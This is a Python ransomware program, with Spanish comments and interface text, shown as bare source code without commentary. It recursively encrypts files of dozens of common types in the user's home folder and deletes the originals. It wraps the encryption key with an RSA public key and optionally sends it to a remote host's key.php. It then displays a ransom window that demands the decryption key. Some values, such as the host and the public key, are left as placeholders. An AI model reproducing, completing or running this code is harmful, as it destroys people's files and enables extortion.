import os
import sys
import requests # type: ignore
import threading
from cryptography.fernet import Fernet # type: ignore
import tkinter as tk
from tkinter import messagebox
import base64
from cryptography.hazmat.primitives.asymmetric import rsa, padding # type: ignore
from cryptography.hazmat.primitives import hashes, serialization # type: ignore
from cryptography.hazmat.primitives.serialization import load_pem_public_key # type: ignore

User_PC = os.path.expanduser('~')
Desc = '!!Your Data has been Encrypted!!'
key = Fernet.generate_key()
host_validation = False
host = 'host'
rhost = host + '/key.php'
public_key_pem = None

public_key = load_pem_public_key(public_key_pem)


file_extensions = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.3g2', '.vdw', '.xla', '.xlsm', '.vssm', '.dotm', '.m3u', '.ppsx',
    '.odt', '.ods', '.odp', '.rtf', '.csv',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif', '.webp',
    '.ico', '.heic',
    '.mp3', '.wav', '.aac', '.ogg', '.flac', '.mp4', '.avi', '.mov',
    '.mkv', '.wmv', '.flv', '.webm', '.3gp',
    '.sql', '.db', '.mdb', '.sqlite', '.dbf',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz',
    '.c', '.cpp', '.h', '.java', '.py', '.rb', '.js', '.php', '.html', '.css',
    '.sql', '.pl', '.sh', '.bat', '.ts', '.go', '.swift', '.r', '.scala',
    '.ini', '.cfg', '.conf', '.log', '.env', '.yaml', '.yml',
    '.plist', '.desktop', '.system',
    '.json', '.xml', '.yaml', '.yml', '.md', '.tex', '.nfo', '.epub',
    '.mobi', '.chm', '.iso', '.dmg', '.img', '.apk', '.bin',
    '.ai', '.eps', '.psd', '.indd', '.svg',
    '.key', '.odp', '.gdoc', '.gsheet', '.gslides'
]


#---------------------------------------------Funciones--------------------------------------------------------
def capture_key():
    def decrypt_file(file_path, key):
        if not file_path.endswith(".zlo"):
            return

        try:
            f = Fernet(key)
            with open(file_path, "rb") as file:
                encrypted_data = file.read()
            decrypted_data = f.decrypt(encrypted_data)
            decrypted_file_path = file_path[:-4]
            with open(decrypted_file_path, "wb") as file:
                file.write(decrypted_data)
            os.remove(file_path)

        except Exception as e:
            print(f'Error en descifrado: {e}')

    dkey = entry.get().encode()
    if len(dkey) != 44:
        messagebox.showerror('Error', 'Clave invalida. La longitud de la clave debe ser de 44 caracteres.')
        return

    for root, dirs, files in os.walk(User_PC):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                try:
                    decrypt_file(file_path, dkey)
                except Exception as e:
                    messagebox.showerror('Error', f'Error al descifrar: {e}')
                    return
    root.destroy()

def advertencia():
    global entry, root
    root = tk.Tk()
    root.title("Tus archivos fueron encriptados")

    main = tk.Label(root, text=Desc)
    main.pack(pady=10)

    entry = tk.Entry(root, width=40)
    entry.pack(pady=5)
    entry.bind('<Return>', lambda event: capture_key())

    accept_button = tk.Button(root, text="Aceptar", command=capture_key)
    accept_button.pack(pady=10)

    root.mainloop()

def encrypt_file(root_dir, key):
    for root, dirs, files in os.walk(root_dir):
        if 'AppData' in root:
            continue
        
        for file in files:
            file_path = os.path.join(root, file)
            if any(file_path.endswith(ext) for ext in file_extensions):
                try:
                    f = Fernet(key)
                    with open(file_path, "rb") as file:
                        file_data = file.read()
                    encrypted_data = f.encrypt(file_data)
                    encrypted_file_path = file_path + ".zlo"
                    with open(encrypted_file_path, "wb") as file:
                        file.write(encrypted_data)
                    os.remove(file_path)

                except Exception as e:
                    print(f'Error en cifrado: {e}')
#--------------------------------------------------------------------------------------------------------------

try:
    encrypted_key = public_key.encrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
except Exception as e:
    sys.exit()

if host_validation:
    parametros = {'key': base64.urlsafe_b64encode(encrypted_key).decode('utf-8')}
    response = requests.get(rhost, params=parametros)
    if response.status_code == 200:
        pass
    else:
        sys.exit()

t = threading.Thread(target=encrypt_file, args=(User_PC, key))
t.start()

advertencia()

t.join()
